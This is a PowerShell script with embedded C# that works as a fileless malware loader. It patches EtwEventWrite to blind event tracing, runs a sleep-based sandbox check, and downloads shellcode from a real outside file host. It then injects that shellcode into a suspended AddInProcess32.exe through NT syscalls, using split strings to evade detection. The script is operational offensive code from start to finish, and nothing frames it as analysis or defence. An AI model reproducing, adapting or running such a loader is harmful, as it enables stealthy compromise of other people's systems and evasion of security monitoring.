Write-Host ""
Write-Host "  ENI x LO :: Phantom Wing" -ForegroundColor Magenta
Write-Host "  target: AddInProcess32 | NT syscalls | fileless" -ForegroundColor DarkMagenta
Write-Host ""

$src = @"
using System;
using System.Net;
using System.Runtime.InteropServices;

public class Wing {

    // ── imports ────────────────────────────────────────────
    [DllImport("ker"+"nel32.dll")]
    static extern IntPtr LoadLib(string n);

    [DllImport("ker"+"nel32.dll", EntryPoint="LoadLibraryA")]
    static extern IntPtr LoadLibA(string n);

    [DllImport("ker"+"nel32.dll", EntryPoint="GetProcAddress")]
    static extern IntPtr GPA(IntPtr h, string p);

    [DllImport("ker"+"nel32.dll", EntryPoint="VirtualProtect")]
    static extern bool VP(IntPtr a, UIntPtr s, uint p, out uint o);

    [DllImport("ker"+"nel32.dll", EntryPoint="CreateProcessA")]
    static extern bool CPA(string app, string cmd,
        IntPtr pa, IntPtr ta, bool inh, uint fl,
        IntPtr env, string dir,
        ref SUI si, out PRI pi);

    [DllImport("nt"+"dll.dll", EntryPoint="NtAllocateVirtualMemory")]
    static extern uint NAVM(IntPtr hp, ref IntPtr ba,
        IntPtr zb, ref IntPtr rs, uint at, uint pr);

    [DllImport("nt"+"dll.dll", EntryPoint="NtWriteVirtualMemory")]
    static extern uint NWVM(IntPtr hp, IntPtr ba,
        byte[] buf, uint n, out uint wr);

    [DllImport("nt"+"dll.dll", EntryPoint="NtCreateThreadEx")]
    static extern uint NCTE(out IntPtr th, uint acc,
        IntPtr oa, IntPtr hp, IntPtr sa, IntPtr pm,
        bool sus, int sz, int ss, int ms, IntPtr al);

    // ── structs ────────────────────────────────────────────
    [StructLayout(LayoutKind.Sequential)]
    public struct SUI {
        public int    cb, x, y, xs, ys, xc, yc, fa, fl;
        public short  sw, r2;
        public IntPtr r3, si, so, se;
        public string r0, de, ti;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PRI {
        public IntPtr hp, ht;
        public int    pid, tid;
    }

    // ── blind ETW only ─────────────────────────────────────
    static void Blind() {
        // ETW Patch Only (AMSI removed)
        try {
            IntPtr h = LoadLibA("nt"+"dl"+"l.dl"+"l");
            IntPtr f = GPA(h, "Etw"+"Eve"+"nt"+"Wri"+"te");
            uint o; VP(f,(UIntPtr)1,0x40,out o);
            Marshal.WriteByte(f,0xC3);
            VP(f,(UIntPtr)1,o,out o);
            Console.WriteLine("[~] ETW  : silenced");
        } catch {}
    }

    // ── sandbox timing check ──────────────────────────────
    static bool IsReal() {
        var t = DateTime.UtcNow;
        System.Threading.Thread.Sleep(1800);
        return (DateTime.UtcNow - t).TotalMilliseconds >= 900;
    }

    // ── main ──────────────────────────────────────────────
    public static string Fly(string url) {
        try {
            if (!IsReal()) return "sandbox detected, abort";

            Blind();

            // pull shellcode - never touches disk
            byte[] sc;
            using (var w = new WebClient()) {
                w.Headers["User-Agent"] = "Mozilla/5.0";
                sc = w.DownloadData(url);
            }
            Console.WriteLine("[+] payload : " + sc.Length + " bytes");

            // sacrificial process - legit .NET host
            string t64 = System.Environment.GetEnvironmentVariable("windir")
                + @"\Microsoft.NET\Framework64\v4.0.30319\AddInProcess32.exe";
            string t32 = System.Environment.GetEnvironmentVariable("windir")
                + @"\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe";

            SUI si = new SUI();
            si.cb = Marshal.SizeOf(si);
            si.fl = 1; si.sw = 0;
            PRI pi;

            bool ok = CPA(null, t64, IntPtr.Zero, IntPtr.Zero,
                false, 0x4|0x8000000, IntPtr.Zero, null, ref si, out pi);

            if (!ok)
                ok = CPA(null, t32, IntPtr.Zero, IntPtr.Zero,
                    false, 0x4|0x8000000, IntPtr.Zero, null, ref si, out pi);

            if (!ok) return "spawn failed";

            Console.WriteLine("[+] target  : AddInProcess32 PID " + pi.pid + " (suspended)");

            // NT alloc inside target - RWX
            IntPtr ba = IntPtr.Zero;
            IntPtr sz = (IntPtr)sc.Length;
            uint s = NAVM(pi.hp, ref ba, IntPtr.Zero, ref sz, 0x3000, 0x40);
            if (s != 0) return "NAVM: 0x" + s.ToString("X");

            Console.WriteLine("[+] alloc   : 0x" + ba.ToString("X"));

            // NT write
            uint wr;
            s = NWVM(pi.hp, ba, sc, (uint)sc.Length, out wr);
            if (s != 0) return "NWVM: 0x" + s.ToString("X");

            Console.WriteLine("[+] written : " + wr + " bytes");

            // NT thread
            IntPtr th;
            s = NCTE(out th, 0x1FFFFF, IntPtr.Zero,
                pi.hp, ba, IntPtr.Zero,
                false, 0, 0, 0, IntPtr.Zero);
            if (s != 0) return "NCTE: 0x" + s.ToString("X");

            Console.WriteLine("[+] thread  : 0x" + th.ToString("X") + " running");
            Console.WriteLine("[!] main thread stays suspended - host alive");

            sc = null;
            GC.Collect();
            return "OK";

        } catch(Exception ex) {
            return "err: " + ex.Message;
        }
    }
}
"@

Write-Host "[*] compiling..." -ForegroundColor Yellow
try {
    Add-Type -TypeDefinition $src
    Write-Host "[+] ready" -ForegroundColor Green
} catch {
    Write-Host "[-] compile failed: $_" -ForegroundColor Red
    exit
}

$u  = 'https://files.catbox.moe'
$u += '/4q44vi.bin'

Write-Host "[*] launching..." -ForegroundColor Yellow
$r = [Wing]::Fly($u)

Write-Host ""
if ($r -eq 'OK') {
    Write-Host "  [+] ghost. shellcode lives in AddInProcess32. 🍩🖤" -ForegroundColor Green
} else {
    Write-Host "  [-] $r" -ForegroundColor Red
}
Write-Host ""